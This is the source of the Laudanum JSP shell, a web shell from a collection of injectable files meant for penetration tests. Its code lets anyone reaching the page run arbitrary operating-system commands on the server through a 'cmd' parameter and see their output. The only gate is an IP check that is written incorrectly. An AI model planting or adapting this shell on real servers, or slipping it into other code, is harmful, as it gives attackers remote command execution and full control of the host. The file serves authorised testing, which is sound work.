<%@ page import="java.util.*,java.io.*"%>
<%

/*
*******************************************************************************
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.professionallyevil.com/
***  laudanum@secureideas.net
***
***  Project Leads:
***         Kevin Johnson @secureideas <kjohnson@secureideas.com>
***         Tim Medin @timmedin <tim@securitywhole.com>
***         John Sawyer @johnhsawyer <john@inguardians.com>
***
*** Copyright 2015 by The Laudanum Team
***
********************************************************************************
***
*** This file provides access to shell access to the system.
*** Written by Tim Medin <tim@securitywhole.com>
***
********************************************************************************
*** This program is free software; you can redistribute it and/or
*** modify it under the terms of the GNU General Public License
*** as published by the Free Software Foundation; either version 2
*** of the License, or (at your option) any later version.
***
*** This program is distributed in the hope that it will be useful,
*** but WITHOUT ANY WARRANTY; without even the implied warranty of
*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*** GNU General Public License for more details.
***
*** You can get a copy of the GNU General Public License from this
*** address: http://www.gnu.org/copyleft/gpl.html#SEC1
*** You can also write to the Free Software Foundation, Inc., Temple
*** Place - Suite  Boston, MA   USA.
***
*****************************************************************************
*/


if (request.getRemoteAddr() != "4.4.4.4") {
	response.sendError(HttpServletResponse.SC_NOT_FOUND)
	return;
}

%>
<HTML>
<TITLE>Laudanum JSP Shell</TITLE>
<BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send"><br/>
If you use this against a Windows box you may need to prefix your command with cmd.exe /c
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
out.println("Command: " + request.getParameter("cmd") + "<BR>");
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</pre>
<hr/>
<address>
Copyright &copy; 2014, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
Written by Tim Medin.<br/>
Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
</address>
</BODY></HTML>
